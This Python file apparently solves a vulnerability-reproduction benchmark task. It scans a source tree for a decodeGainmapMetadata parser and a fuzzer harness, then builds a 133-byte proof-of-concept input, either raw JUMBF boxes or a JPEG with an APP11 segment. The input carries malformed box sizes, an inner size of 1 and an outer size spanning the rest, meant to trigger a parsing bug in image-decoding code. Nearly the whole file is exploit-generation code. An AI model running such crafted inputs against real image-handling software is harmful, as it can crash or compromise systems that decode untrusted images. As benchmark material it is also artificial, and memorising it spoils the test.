import os
import re
import tarfile
import tempfile
from typing import Dict, List, Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = self._prepare_root(src_path)

        decode_file_text = self._find_decode_gainmap_metadata_text(root)
        sig = self._detect_signature(decode_file_text)
        box_types = self._detect_box_types(decode_file_text)

        harness_info = self._find_best_fuzzer_harness(root)
        use_jpeg_wrapper = False
        if harness_info is not None:
            harness_path, harness_text = harness_info
            direct = self._harness_calls_decode_directly(harness_text)
            if not direct:
                if self._harness_looks_like_image_input(harness_text):
                    use_jpeg_wrapper = True

        target_total_len = 133
        if use_jpeg_wrapper:
            return self._build_jpeg_app11_poc(
                total_len=target_total_len,
                signature=sig,
                outer_type=box_types.get("outer", b"jumb"),
                inner_type=box_types.get("inner", b"jumd"),
            )
        else:
            return self._build_raw_poc(
                total_len=target_total_len,
                signature=sig,
                outer_type=box_types.get("outer", b"jumb"),
                inner_type=box_types.get("inner", b"jumd"),
            )

    def _prepare_root(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path
        tmpdir = tempfile.mkdtemp(prefix="src_")
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                self._safe_extract(tf, tmpdir)
            return tmpdir
        return tmpdir

    def _safe_extract(self, tf: tarfile.TarFile, path: str) -> None:
        abs_path = os.path.abspath(path)
        for member in tf.getmembers():
            member_name = member.name
            if member_name.startswith("/") or member_name.startswith("\\"):
                continue
            dest = os.path.abspath(os.path.join(path, member_name))
            if not dest.startswith(abs_path + os.sep) and dest != abs_path:
                continue
            try:
                tf.extract(member, path=path)
            except Exception:
                pass

    def _iter_source_files(self, root: str) -> List[str]:
        exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx", ".inc", ".ipp",
            ".m", ".mm",
        }
        out = []
        for dirpath, dirnames, filenames in os.walk(root):
            dirnames[:] = [d for d in dirnames if d not in {".git", ".svn", "build", "out", "bazel-out"}]
            for fn in filenames:
                ext = os.path.splitext(fn)[1].lower()
                if ext in exts:
                    p = os.path.join(dirpath, fn)
                    try:
                        st = os.stat(p)
                        if st.st_size <= 5_000_000:
                            out.append(p)
                    except Exception:
                        pass
        return out

    def _read_text(self, path: str) -> str:
        try:
            with open(path, "rb") as f:
                b = f.read()
            return b.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _find_decode_gainmap_metadata_text(self, root: str) -> str:
        best_text = ""
        best_score = -1
        for p in self._iter_source_files(root):
            txt = self._read_text(p)
            if "decodeGainmapMetadata" not in txt:
                continue
            score = txt.count("decodeGainmapMetadata")
            if "decodeGainmapMetadata(" in txt:
                score += 2
            if score > best_score:
                best_score = score
                best_text = txt
        return best_text

    def _detect_signature(self, decode_text: str) -> bytes:
        if not decode_text:
            return b"JP\x00\x01"

        if re.search(r'JP\\0\\1|JP\\x00\\x01', decode_text):
            return b"JP\x00\x01"

        if "0x4A" in decode_text and "0x50" in decode_text and ("0x00" in decode_text or "0x01" in decode_text):
            return b"JP\x00\x01"

        if re.search(r'["\']JP["\']', decode_text) and re.search(r'0x00\s*,\s*0x01|\\0\\1', decode_text):
            return b"JP\x00\x01"

        if "jumb" in decode_text or "jumd" in decode_text:
            return b"JP\x00\x01"

        return b"JP\x00\x01"

    def _detect_box_types(self, decode_text: str) -> Dict[str, bytes]:
        outer = b"jumb"
        inner = b"jumd"
        if decode_text:
            fourccs = set(re.findall(r"['\"]([A-Za-z0-9 ]{4})['\"]", decode_text))
            if "jumb" in fourccs:
                outer = b"jumb"
            elif "JUMB" in fourccs:
                outer = b"JUMB"

            if "jumd" in fourccs:
                inner = b"jumd"
            elif "JUMD" in fourccs:
                inner = b"JUMD"
        return {"outer": outer, "inner": inner}

    def _find_best_fuzzer_harness(self, root: str) -> Optional[Tuple[str, str]]:
        best = None
        best_score = -1
        for p in self._iter_source_files(root):
            txt = self._read_text(p)
            if "LLVMFuzzerTestOneInput" not in txt:
                continue
            score = 0
            score += 50 * txt.count("decodeGainmapMetadata")
            score += 10 * (1 if re.search(r"\bgainmap\b", txt, re.IGNORECASE) else 0)
            score += 5 * (1 if re.search(r"\bjumbf\b", txt, re.IGNORECASE) else 0)
            score += 3 * (1 if re.search(r"\bjpeg\b|\bjpg\b|\bSkCodec\b", txt, re.IGNORECASE) else 0)
            if score > best_score:
                best_score = score
                best = (p, txt)
        return best

    def _harness_calls_decode_directly(self, harness_text: str) -> bool:
        if "decodeGainmapMetadata" not in harness_text:
            return False
        patterns = [
            r"decodeGainmapMetadata\s*\(\s*data\s*,\s*size",
            r"decodeGainmapMetadata\s*\(\s*Data\s*,\s*Size",
            r"decodeGainmapMetadata\s*\(\s*reinterpret_cast<[^>]+>\(\s*data\s*\)",
            r"decodeGainmapMetadata\s*\(\s*reinterpret_cast<[^>]+>\(\s*Data\s*\)",
        ]
        for pat in patterns:
            if re.search(pat, harness_text):
                return True
        if re.search(r"decodeGainmapMetadata\s*\(\s*data\b", harness_text):
            return True
        return False

    def _harness_looks_like_image_input(self, harness_text: str) -> bool:
        needles = [
            "SkCodec::MakeFromData",
            "SkJpeg",
            "SkPng",
            "DecodeImage",
            "stbi_load",
            "avifDecoder",
            "heif_context_read_from_memory",
            "tjDecompressHeader",
            "jpeg_read_header",
        ]
        return any(n in harness_text for n in needles)

    def _be32(self, x: int) -> bytes:
        return bytes([(x >> 24) & 0xFF, (x >> 16) & 0xFF, (x >> 8) & 0xFF, x & 0xFF])

    def _make_gainmap_padding(self, n: int) -> bytes:
        s1 = b"GainMap"
        s2 = b"urn:iso:std:iso:ts:21496:-1"
        out = bytearray()
        while len(out) < n:
            if len(out) + len(s1) + 1 <= n:
                out += s1 + b"\x00"
            if len(out) + len(s2) + 1 <= n:
                out += s2 + b"\x00"
            if len(out) < n:
                out += b"\x00" * min(16, n - len(out))
        return bytes(out[:n])

    def _build_raw_poc(self, total_len: int, signature: bytes, outer_type: bytes, inner_type: bytes) -> bytes:
        if total_len < 24:
            total_len = 24

        # Structure:
        # [signature (4)]
        # [outer box header: size(4) + type(4)]
        # [inner box header: size=1 (4) + type(4)]
        # [inner body (remaining)]
        sig = signature[:4].ljust(4, b"\x00")

        remaining_after_sig = total_len - 4
        outer_size = remaining_after_sig
        outer_hdr = self._be32(outer_size) + outer_type[:4].ljust(4, b" ")

        inner_size = 1
        inner_hdr = self._be32(inner_size) + inner_type[:4].ljust(4, b" ")

        inner_body_len = total_len - (len(sig) + len(outer_hdr) + len(inner_hdr))
        if inner_body_len < 0:
            inner_body_len = 0

        # Put a plausible-looking "fullbox" header and some strings for parsers that scan.
        body = bytearray()
        body += b"\x00\x00\x00\x00"  # version/flags
        if len(body) < inner_body_len:
            body += self._make_gainmap_padding(inner_body_len - len(body))
        body = body[:inner_body_len]

        return sig + outer_hdr + inner_hdr + bytes(body)

    def _build_jpeg_app11_poc(self, total_len: int, signature: bytes, outer_type: bytes, inner_type: bytes) -> bytes:
        # JPEG structure:
        # SOI: FFD8
        # APP11: FFEB + length(2) + payload
        # EOI: FFD9
        # length includes itself (2 bytes) and payload bytes.
        if total_len < 12:
            total_len = 12

        overhead = 2 + 2 + 2 + 2  # SOI + marker + length + EOI
        payload_len = total_len - overhead
        if payload_len < 0:
            payload_len = 0
        if payload_len < 16:
            payload_len = 16
            total_len = overhead + payload_len

        # payload begins with signature and then box data
        sig = signature[:4].ljust(4, b"\x00")
        box_len = payload_len - 4
        if box_len < 16:
            box_len = 16
            payload_len = 4 + box_len
            total_len = overhead + payload_len

        # Build boxes inside payload
        # Outer box consumes all remaining after signature.
        outer_size = box_len
        outer_hdr = self._be32(outer_size) + outer_type[:4].ljust(4, b" ")
        inner_hdr = self._be32(1) + inner_type[:4].ljust(4, b" ")
        inner_body_len = box_len - (len(outer_hdr) + len(inner_hdr))
        if inner_body_len < 0:
            inner_body_len = 0

        body = bytearray()
        body += b"\x00\x00\x00\x00"
        if len(body) < inner_body_len:
            body += self._make_gainmap_padding(inner_body_len - len(body))
        body = body[:inner_body_len]

        payload = sig + outer_hdr + inner_hdr + bytes(body)

        seglen = len(payload) + 2
        if seglen > 0xFFFF:
            payload = payload[: (0xFFFF - 2)]
            seglen = 0xFFFF

        soi = b"\xFF\xD8"
        app11 = b"\xFF\xEB" + bytes([(seglen >> 8) & 0xFF, seglen & 0xFF]) + payload
        eoi = b"\xFF\xD9"
        jpeg = soi + app11 + eoi

        if len(jpeg) != total_len:
            # Try to match requested size by trimming or padding payload (shouldn't be necessary, but keep stable).
            if len(jpeg) > total_len:
                # Trim from payload tail but keep EOI.
                trim = len(jpeg) - total_len
                if trim < len(payload):
                    payload2 = payload[:-trim]
                    seglen2 = len(payload2) + 2
                    app11 = b"\xFF\xEB" + bytes([(seglen2 >> 8) & 0xFF, seglen2 & 0xFF]) + payload2
                    jpeg = soi + app11 + eoi
            else:
                # Pad inside payload tail.
                add = total_len - len(jpeg)
                if len(payload) + add <= 0xFFFF - 2:
                    payload2 = payload + (b"\x00" * add)
                    seglen2 = len(payload2) + 2
                    app11 = b"\xFF\xEB" + bytes([(seglen2 >> 8) & 0xFF, seglen2 & 0xFF]) + payload2
                    jpeg = soi + app11 + eoi

        return jpeg[:total_len]